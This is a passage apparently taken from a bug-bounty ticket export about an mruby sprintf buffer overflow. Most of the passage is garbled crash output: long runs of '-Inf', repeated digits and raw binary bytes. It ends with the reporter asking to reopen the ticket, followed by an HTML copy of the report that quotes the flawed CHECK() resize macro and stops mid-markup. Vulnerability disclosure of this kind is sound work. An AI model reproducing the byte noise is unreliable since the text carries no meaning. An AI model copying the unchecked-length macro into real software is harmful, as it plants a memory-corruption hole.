nf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Infnfnfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-hT�I\u0001-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�-Inf3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-In-Inf222222222222222222222222222222222-Inf-InfInfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf88888888888%-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-InfۣC�-Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�P\u000f�-Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf\u0026���-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�(-Inf\u0001-Inf\f-Inf�(-Inf\u0002-Infp�\u0002-Inf-InfInf-nf-Inf-Inf-Inf-Inf--InfInf-\n-Inf�(-Inf\u0002-Inf�թ\u0002-Inf�\u0014�\u0002-Inf�P�\u0002-Inf-InfInf--Inf�(-Inf\u0003-Inf`�j\u0002-Inf-Inf-Inf\u0005-Inf�(-Inf\u0002-Inf\u0004-Inf�(-Inf\u0002-Inf\u0003-Inf�(--InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--InfInf-9-InfP-Inf\u0003-Inf�U\f\u0003-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf22222222l\n-Infq-Inf\u0003-Inf�\u001b-Infq-Inf\u0003-Inf��u\u0003-Inf-InfG%*G%*G%*G%*G%*G%*G-Inf�1(-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf111111111111�\u0002M�1)-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333%*G%*G%*G-Inf888888888888�\u0002-�8*-Inf33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�1+-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-Inf888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf��\u0012�-Inf22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-InfInf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�V\u0013�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf22222222222-I-Inf-Infnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf--Inf8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888%*G%*G%*G%*G%*G%*G%*G%*G-Inf�3\u0026-Inf333333333333333333333333333333333333333333333333333333333333333333333333333333-In-Inf-InfInfnf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf�-Inf88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-I-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-Inf-In-Inf3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-Inf3333\u0003-Inf�--Inf\n```\n\nIt will be really appreciated if you reconsider the closing of this ticket, as this is a major vulnerability in your project, and it is far from being a duplicate to my previous ticket you mentioned.","markdown_message":"\u003cp\u003eI saw that you merged my fix from MRuby to CRuby regarding the 1st issue in the CHECK() macro. However, even this macro has vulnerabilities, as I clearly mentioned in initial report:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e#define CHECK(l) do {\\\n\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*  int cr = ENC_CODERANGE(result);*/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\\\n  while ((l) \u0026gt;= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*  ENC_CODERANGE_SET(result, cr);*/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor example, this code snippet can reach a negative \u0026quot;l\u0026quot; parameter for the CHECK(l) macro, resulting in a small buffer overflow when writing the NaN/Inf expression:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e   \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eFWIDTH\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003eCHECK\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"n\"\u003esnprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;%*s\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan 